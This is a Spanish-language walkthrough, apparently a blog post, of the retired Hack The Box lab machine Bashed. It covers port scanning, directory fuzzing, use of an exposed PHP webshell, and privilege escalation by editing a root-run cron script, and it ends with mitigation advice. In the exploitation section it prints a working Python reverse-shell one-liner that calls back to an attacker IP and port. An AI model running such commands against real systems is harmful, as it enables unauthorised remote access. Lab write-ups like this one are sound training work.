---
title: "Resolución de la máquina bashed"
date: 2025-10-04 20:00:00 +0100
categories: [Ciberseguridad,Maquina]
tags: [dificultad_facil, linux, fuzzing]
description: "Máquina Bashed de Hack The Box "
image:
  path: /assets/img/posts/WriteUpBashed/bashed.png
  alt: "Información de Bashed"
---
## Introducción

En este post veremos la resolución de la maquina retirada Bashed de Hack The Box , es una maquina linux de dificultad facil y  en ella tocaremos los siguientes temas.

- Fuzzing

- Webshell

---

## 1 Reconocimiento

### 1.1 Escaneo de puertos

Como siempre primero empezaremos con un escaneo de los 65535 puertos para ver cuales de ellos tienen el estado open en la maquina victima , los estados filtered y closed de momento no nos interesan , para ello vamos a usar el comando:

`nmap -p- --open -sS --min-rate=5000 -vvv -Pn -n -oG allPorts 10.129.47.227` 

Siendo los parametros -p- para incluir todos los puertos existentes, --open para filtrar por los que tengan el estado open, -sS para realizar un SYN Scan que es mas rapido y sigiloso que un escaneo al uso con el parametro -sT ya que no se completa el handshake, con el parametro --min-rate=5000 especificamos que no queremos que se envien menos de 5000 paquetes por segundo para que sea rapido aunque poco sigiloso pero como estamos en un entorno controlado no tiene importancia, usamos -vvv para especificar triple verbose y que nos vaya reportando informacion segun la va descubriendo , el parametro -Pn para omitir el descubrimiento de host ya que sabemos que el host esta activo y nos ahorramos el paquete que se envia para comprobar si esta activo , por ultimo , empleamos -n para omitir la resolución DNS y el parametro -oG para exportar la salida a un archivo en formato grepeable para el posterior analisis.


![1768763189775](/assets/img/posts/WriteUpBashed/escaneoinicial.png)

Descubrimos en el escaneo inicial que solo tiene el puerto 80 abierto que se corresponde a un servicio web , ahora procedemos a un escaneo detallado del puerto donde identificaremos servicio y version que esta corriendo en el puerto abierto de la maquina, para ello empleamos el comando:


`nmap -sCV -p80 -oN targeted 10.129.47.227`

En este caso usamos el parametro -s para identificar version y servicio siendo C para emplear los scripts predeterminados de nmap y V para identificar la versión del servicio.

![1768763189775](/assets/img/posts/WriteUpBashed/escaneocompleto.png)

Con este escaneo descubrimos la siguiente información:

- En el puerto 80 se emplea el servicio Apache con la versión 2.4.18 --> Desactualizada y con multiples cves.

Ahora procedemos al reconocimiento web

### 1.2 Reconocimiento web 

Ahora procedemos a extraer información de la web, nos encontramos con una pagina donde promocionan un proyecto de una especie de webshell en php.

![1768763189775](/assets/img/posts/WriteUpBashed/web.png)

Nos dan una imagen de como funciona la webshell y en la barra de direcciones se ve un directorio llamado /uploads, probe esa ruta en la web y sorprendentente funciono pero no podia listar archivos, asi que probe a hacer fuzzing de directorios.

![1768763189775](/assets/img/posts/WriteUpBashed/webshell.png)


### 1.3 Fuzzing

Continuando con la enumeración y la existencia del directorio /uploads, hice fuzzing con un diccionario de SecLists de directorios con el comando:


`wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.129.49.11/FUZZ' -t 50 --hc=404`


![1768763189775](/assets/img/posts/WriteUpBashed/fuzzingdirectorios.png)

Vemos que hay varios directorios activos, hay dos que me llaman la atencion:

- /dev

- /uploads

El directorio /uploads no es posible listar archivos.


Revisando directorios vemos que en /dev nos encontramos dos archivos uno llamado phpbash.min.php y otro llamado phpbash.php.

![1768763189775](/assets/img/posts/WriteUpBashed/dev.png)

## 3 Explotación

### 3.1 Webshell 


Inocentemente vemos que si seleccionamos el archivo phpbash.php obtenemos una webshell 


![1768763189775](/assets/img/posts/WriteUpBashed/shell.png)


Procedemos a reconocer el sistema y vemos que la flag del usuario se encuentra en la ruta /home/arrexel


![1768763189775](/assets/img/posts/WriteUpBashed/flag1.png)


### 3.2 Shell 

Debido a que por webshell no tenemos todas las caracteristicas de una shell normal , mandamos una shell a la maquina atacante con el comando siguiente modificando la ip y el puerto por el que estaremos en escucha en la maquina atacante.


`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.240",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

Nos ponemos en escucha en la maquina atacante por el puerto 4444 con el comando:

`nc -nvlp 4444`


Ejecutamos el primer comando en la webshell y obtenemos acceso a una shell en nuestra maquina atacante:

![1768763189775](/assets/img/posts/WriteUpBashed/shell2.png)

## 4 Escalada de privilegios

### 4.1 Listado de permisos de sudo del usuario actual

Listando permisos del usuario www-data vemos que puede ejecutar cualquier comando como el usuario scriptmanager por lo tanto lanzamos una bash como scriptmanager con el comando siguiente:

`sudo -u scriptmanager /bin/bash`

![1768763189775](/assets/img/posts/WriteUpBashed/sudol.png) 

Explorando directorios vemos que el directorio /scripts contiene dos archivos , uno llamado test.py que lo ejecuta scriptmanager y otro llamado test.txt que lo ejecuta root.

![1768763189775](/assets/img/posts/WriteUpBashed/scripts.png) 

Pense que este script se ejecutaba periodicamente asi que probe a modificar el archivo test.py con codigo para que mandase una consola a la maquina atacante por el puerto 4444.


![1768763189775](/assets/img/posts/WriteUpBashed/test.png) 

Me puse en escucha por el puerto 4444 en la maquina y como se ejecutaba cada pocos segundos o minutos me envio una consola interactiva como root.

![1768763189775](/assets/img/posts/WriteUpBashed/root.png) 


Estando como root ya tenemos acceso total al sistema y podemos encontrar la flag para completar la maquina.

![1768763189775](/assets/img/posts/WriteUpBashed/flag2.png) 


## 4 Mitigación de vectores de ataque

Si esta maquina de Hack The Box hubiese sido un entorno real podriamos haber tomado las siguientes medidas para haber evitado un ataque como este:

#### Fase de reconocimiento

 - En este caso lo ideal seria que no hubiese una bash en php en el servidor , pero si tuviese que estar por x motivos , lo ideal sería que no tuviese permisos para listar archivos los usuarios en las carpetas expuestas al publico, ya que si no hubiese podido listar los archivos no hubiese podido tener acceso a la bash inicial.

#### Fase de explotación y escalada de privilegios

  - En cuanto a explotación en esta maquina lo que se podria haber evitado era que el usuario www-data no hubiese podido ejecutar cualquier comando como scriptmanager.

  - Para escalada de privilegios , el archivo test.py no deberia poder ser editado por el usuario scriptmanager ya que es peligroso. Si tuviese que existir ese archivo lo mejor sería que solo pudiese leerlo y editarlo root
  
  